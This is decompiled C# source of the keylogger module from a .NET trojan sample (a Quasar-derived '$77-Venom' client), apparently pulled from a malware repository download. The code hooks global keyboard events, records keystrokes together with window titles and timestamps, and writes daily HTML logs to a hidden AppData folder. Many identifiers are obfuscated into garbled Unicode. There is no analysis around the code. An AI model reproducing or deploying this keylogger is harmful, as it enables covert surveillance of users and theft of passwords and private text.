// Decompiled with JetBrains decompiler
// Type: xClient.Core.Utilities.Keylogger
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities
{
  public class Keylogger : IDisposable
  {
    public static Keylogger Instance;
    private readonly System.Timers.Timer _timerFlush;
    private StringBuilder _logFileBuffer;
    private List<Keys> _pressedKeys = new List<Keys>();
    private List<char> _pressedKeyChars = new List<char>();
    private string _lastWindowTitle;
    private bool _ignoreSpecialKeys;
    private IKeyboardMouseEvents _mEvents;

    public bool IsDisposed { get; private set; }

    public static string LogDirectory => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.\uFFFD픗룕祱햝瓋\u33B2\uFFFD괿꿶\u2421싌\uEF0A钓遹貳편䨍\u3212\uE7CD);

    public Keylogger(double flushInterval)
    {
      Keylogger.Instance = this;
      this._lastWindowTitle = string.Empty;
      this._logFileBuffer = new StringBuilder();
      this.Subscribe(窬䴹Ө龮練湍怚し쁧֚\uE7E9ꫛꎋ\uEC06㞑ꫝఫ묠硖她.䶐뀫罔\uF7AC퀋\uE040\u2065룊体煴儉珚醪ᩯ転董Ꙥ䎚ᷮ樴());
      this._timerFlush = new System.Timers.Timer()
      {
        Interval = flushInterval
      };
      this._timerFlush.Elapsed += new ElapsedEventHandler(this.timerFlush_Elapsed);
      this._timerFlush.Start();
      this.WriteFile();
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (this.IsDisposed)
        return;
      if (disposing && this._timerFlush != null)
      {
        this._timerFlush.Stop();
        this._timerFlush.Dispose();
      }
      this.Unsubscribe();
      this.IsDisposed = true;
    }

    private void Subscribe(IKeyboardMouseEvents events)
    {
      this._mEvents = events;
      this._mEvents.\u2194㡐좻ⲃ̻臄\u1CC1반运昽\uFFFD풶븟ᗼﵸ妈͖\uE3CE씆\uE834 += new KeyEventHandler(this.OnKeyDown);
      this._mEvents.軦⁔쩭珍ආ骵뗐횻皏䑍譍\u28E7敇\uF87F\u21F4\uA63A\uE4FA핾\u33A0礁 += new KeyEventHandler(this.OnKeyUp);
      this._mEvents.\uFFFD맑훋莍娆鮝竣\uF6E7癢\uFFFDᏣ믉펵Ꮧᄤ쯚\uF80Fⲳ㟆\uF5BB += new KeyPressEventHandler(this.OnKeyPress);
    }

    private void Unsubscribe()
    {
      if (this._mEvents == null)
        return;
      this._mEvents.\u2194㡐좻ⲃ̻臄\u1CC1반运昽\uFFFD풶븟ᗼﵸ妈͖\uE3CE씆\uE834 -= new KeyEventHandler(this.OnKeyDown);
      this._mEvents.軦⁔쩭珍ආ骵뗐횻皏䑍譍\u28E7敇\uF87F\u21F4\uA63A\uE4FA핾\u33A0礁 -= new KeyEventHandler(this.OnKeyUp);
      this._mEvents.\uFFFD맑훋莍娆鮝竣\uF6E7癢\uFFFDᏣ믉펵Ꮧᄤ쯚\uF80Fⲳ㟆\uF5BB -= new KeyPressEventHandler(this.OnKeyPress);
      this._mEvents.Dispose();
    }

    private void OnKeyDown(object sender, KeyEventArgs e)
    {
      string input = ꄪ調轩㹡\uFDDD쑍靼悮䕛ꨩ\u1C89㾬\uFFFDㇺ㰤䘎펧㶌봆\uE560.넆巤鴉㓎䁐䥥㖳鵸藬䏋\u2F7A䀙\u1289挈ᰟ졋ꚤ唤ﭿ\u2E62();
      if (!string.IsNullOrEmpty(input) && input != this._lastWindowTitle)
      {
        this._lastWindowTitle = input;
        this._logFileBuffer.Append("<p class=\"h\"><br><br>[<b>" + ꄪ調轩㹡\uFDDD쑍靼悮䕛ꨩ\u1C89㾬\uFFFDㇺ㰤䘎펧㶌봆\uE560.\u0743䋣為㛤暀熼붙쵮鴲\uE05F䣘\uF71AȰ寤ꎻ\u3373깜\u087Aྐ㷋(input) + " - " + DateTime.Now.ToString("HH:mm") + "</b>]</p><br>");
      }
      if (this._pressedKeys.IsModifierKeysSet() && !this._pressedKeys.Contains(e.KeyCode))
      {
        this._pressedKeys.Add(e.KeyCode);
      }
      else
      {
        if (e.KeyCode.IsExcludedKey() || this._pressedKeys.Contains(e.KeyCode))
          return;
        this._pressedKeys.Add(e.KeyCode);
      }
    }

    private void OnKeyPress(object sender, KeyPressEventArgs e)
    {
      if (this._pressedKeys.IsModifierKeysSet() && this._pressedKeys.ContainsKeyChar(e.KeyChar) || this._pressedKeyChars.Contains(e.KeyChar) && ꄪ調轩㹡\uFDDD쑍靼悮䕛ꨩ\u1C89㾬\uFFFDㇺ㰤䘎펧㶌봆\uE560.띸ꅞ\uF60C쒎흣Ϭ澍솠ଅ뫔\u2E84０ⶺ\u20B7\uECB9ᾞ睏뚠洑蚫(this._pressedKeyChars, e.KeyChar) || this._pressedKeys.ContainsKeyChar(e.KeyChar))
        return;
      string str = ꄪ調轩㹡\uFDDD쑍靼悮䕛ꨩ\u1C89㾬\uFFFDㇺ㰤䘎펧㶌봆\uE560.ℱ깔쑱榊夌뵞郞\uFFFD\u243D鴯鹼ೈ膁漾漄ﰕ\u33EB磻夅\u2419(e.KeyChar);
      if (string.IsNullOrEmpty(str))
        return;
      if (this._pressedKeys.IsModifierKeysSet())
        this._ignoreSpecialKeys = true;
      this._pressedKeyChars.Add(e.KeyChar);
      this._logFileBuffer.Append(str);
    }

    private void OnKeyUp(object sender, KeyEventArgs e)
    {
      this._logFileBuffer.Append(this.HighlightSpecialKeys(this._pressedKeys.ToArray()));
      this._pressedKeyChars.Clear();
    }

    private string HighlightSpecialKeys(Keys[] keys)
    {
      if (keys.Length < 1)
        return string.Empty;
      string[] strArray = new string[keys.Length];
      for (int index = 0; index < keys.Length; ++index)
      {
        if (!this._ignoreSpecialKeys)
        {
          strArray[index] = ꄪ調轩㹡\uFDDD쑍靼悮䕛ꨩ\u1C89㾬\uFFFDㇺ㰤䘎펧㶌봆\uE560.\uE6E6ⷌ宸䧹\uFFFD䐼桯蔼聮茔ꑘ\uF777杦皷톶\uFFFD榺쵕\u09FC齌(keys[index]);
        }
        else
        {
          strArray[index] = string.Empty;
          this._pressedKeys.Remove(keys[index]);
        }
      }
      this._ignoreSpecialKeys = false;
      if (this._pressedKeys.IsModifierKeysSet())
      {
        StringBuilder stringBuilder = new StringBuilder();
        int num = 0;
        for (int index = 0; index < strArray.Length; ++index)
        {
          this._pressedKeys.Remove(keys[index]);
          if (!string.IsNullOrEmpty(strArray[index]))
          {
            stringBuilder.AppendFormat(num == 0 ? "<p class=\"h\">[{0}" : " + {0}", (object) strArray[index]);
            ++num;
          }
        }
        if (num > 0)
          stringBuilder.Append("]</p>");
        return stringBuilder.ToString();
      }
      StringBuilder stringBuilder1 = new StringBuilder();
      for (int index = 0; index < strArray.Length; ++index)
      {
        this._pressedKeys.Remove(keys[index]);
        if (!string.IsNullOrEmpty(strArray[index]))
        {
          switch (strArray[index])
          {
            case "Return":
              stringBuilder1.Append("<p class=\"h\">[Enter]</p><br>");
              continue;
            case "Escape":
              stringBuilder1.Append("<p class=\"h\">[Esc]</p>");
              continue;
            default:
              stringBuilder1.Append("<p class=\"h\">[" + strArray[index] + "]</p>");
              continue;
          }
        }
      }
      return stringBuilder1.ToString();
    }

    private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
    {
      if (this._logFileBuffer.Length <= 0 || \uE606녀㵅\u21C1牥覴彀ﲒ\uFFFDᰯ쏘\uF7E6搃賢\u32F7銅\uE976\uF4FD\uEC0C樛.Exiting)
        return;
      this.WriteFile();
    }

    private void WriteFile()
    {
      bool flag = false;
      string str = Path.Combine(Keylogger.LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Keylogger.LogDirectory);
        if (!directoryInfo.Exists)
          directoryInfo.Create();
        if (윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䅨\u9FD8\uFFFDዬ笾즢\uF5DF稨傳哌䝫徭ﴬ쇘稲\uE155複\u2460ᓷ\uE62A)
          directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        if (!File.Exists(str))
          flag = true;
        StringBuilder stringBuilder = new StringBuilder();
        if (flag)
        {
          stringBuilder.Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
          stringBuilder.Append("<style>.h { color: 0000ff; display: inline; }</style>");
          this._lastWindowTitle = string.Empty;
        }
        if (this._logFileBuffer.Length > 0)
          stringBuilder.Append((object) this._logFileBuffer);
        环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.췂㮜慫⃨ﰉᦋ蠯\uEC6D흊䐕嚛ﭑ䏢\u2574啵\u2403\uF535ð鉏\uFFFD(str, stringBuilder.ToString());
        stringBuilder.Clear();
      }
      catch
      {
      }
      this._logFileBuffer.Clear();
    }
  }
}
